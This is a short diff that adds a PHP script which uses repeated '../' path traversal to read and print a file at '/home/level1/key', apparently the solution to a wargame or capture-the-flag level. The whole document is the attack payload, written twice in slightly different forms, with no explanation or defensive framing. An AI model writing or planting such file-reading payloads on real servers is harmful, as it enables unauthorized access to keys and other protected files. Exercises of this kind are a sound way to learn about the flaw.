@@ -1,0 +1,6 @@
+<?php
+$test = file_get_contents('../../../../../../../../../../../../../../home/level1/key');
+echo $test;
+?>
+
+<?php echo file_get_contents('./../../../home/level1/key');
